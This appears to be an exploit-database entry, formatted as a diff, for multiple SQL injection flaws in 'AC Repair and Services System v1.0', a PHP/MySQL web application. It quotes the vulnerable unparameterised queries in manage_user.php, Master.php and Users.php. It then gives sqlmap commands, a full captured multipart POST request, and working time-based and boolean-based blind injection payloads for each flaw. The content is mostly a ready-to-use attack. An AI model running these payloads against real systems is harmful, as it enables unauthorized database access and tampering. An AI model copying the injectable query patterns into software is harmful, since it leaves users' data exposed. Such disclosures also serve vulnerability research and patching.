@@ -1,0 +1,207 @@
+id: 39396
+date: 03/04/2024
+title: AC Repair and Services System v1.0 - Multiple SQL Injection Vulnerability
+author: Gnanaraj Mauviel
+cves: 
+
+# Exploit Title: AC Repair and Services System v1.0 - Multiple SQL Injection
+# Exploit Author: Gnanaraj Mauviel (@0xm3m)
+# Vendor: oretnom23
+# Vendor Homepage: https://www.sourcecodester.com/php/16513/ac-repair-and-services-system-using-php-and-mysql-source-code-free-download.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-acrss.zip
+# Version: v1.0
+# Tested on: Mac OSX, XAMPP, Apache, MySQL
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+Source Code(/php-acrss/admin/user/manage_user.php):
+
+<?php 
+if(isset($_GET['id'])){
+    $user = $conn->query("SELECT * FROM users where id ='{$_GET['id']}' ");
+    foreach($user->fetch_array() as $k =>$v){
+        $meta[$k] = $v;
+    }
+}
+?>
+
+-> sqlmap -u "http://localhost/php-acrss/admin/?page=user/manage_user&id=" --batch
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: page=user/manage_user&id=' AND (SELECT 5500 FROM (SELECT(SLEEP(5)))hiCZ) AND 'rZIs'='rZIs
+---
+
+Source Code(/php-acrss/classes/Master.php):
+
+function delete_inquiry(){
+		extract($_POST);
+		$del = $this->conn->query("DELETE FROM `inquiry_list` where id = '{$id}'");
+		if($del){
+			$resp['status'] = 'success';
+			$this->settings->set_flashdata('success'," Inquiry successfully deleted.");
+		}else{
+			$resp['status'] = 'failed';
+			$resp['error'] = $this->conn->error;
+		}
+		return json_encode($resp);
+
+	}
+
+-> sqlmap -u "http://localhost/php-acrss/classes/Master.php?f=delete_inquiry" --data="id=*" --batch
+---
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=' AND (SELECT 7930 FROM (SELECT(SLEEP(5)))XwlG) AND 'Jimw'='Jimw
+---
+
+Source Code(/php-acrss/classes/Users.php):
+
+$qry = $this->conn->query("UPDATE users set $data where id = {$id}");
+			if($qry){
+				$this->settings->set_flashdata('success','User Details successfully updated.');
+				foreach($_POST as $k => $v){
+					if($k != 'id'){
+						if(!empty($data)) $data .=" , ";
+						if($this->settings->userdata('id') == $id)
+							$this->settings->set_userdata($k,$v);
+					}
+				}
+
+POST /php-acrss/classes/Users.php?f=save HTTP/1.1
+Host: localhost
+Content-Length: 943
+sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
+Accept: */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAUtgvsSwiJifz27g
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+sec-ch-ua-platform: "macOS"
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/php-acrss/admin/?page=user/manage_user&id=9
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=o92n8nati3696kg69plidv5e77
+Connection: close
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="id"
+
+9
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="firstname"
+
+Claire
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="middlename"
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="lastname"
+
+Blake
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="username"
+
+cblake
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="password"
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="type"
+
+2
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="img"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g--
+
+-> sqlmap -r ~/Documents/POST-localhost.txt --batch
+
+---
+Parameter: MULTIPART id ((custom) POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: ------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="id"
+
+(SELECT (CASE WHEN (3947=3947) THEN 9 ELSE (SELECT 2252 UNION SELECT 2638) END))
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="firstname"
+
+Claire
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="middlename"
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="lastname"
+
+Blake
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="username"
+
+cblake
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="password"
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="type"
+
+2
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="img"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="id"
+
+9 AND (SELECT 7168 FROM (SELECT(SLEEP(5)))pifO)
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="firstname"
+
+Claire
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="middlename"
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="lastname"
+
+Blake
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="username"
+
+cblake
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="password"
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="type"
+
+2
+------WebKitFormBoundaryAUtgvsSwiJifz27g
+Content-Disposition: form-data; name="img"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundaryAUtgvsSwiJifz27g--
+---
+
+#  0day.today [2024-03-06]  #
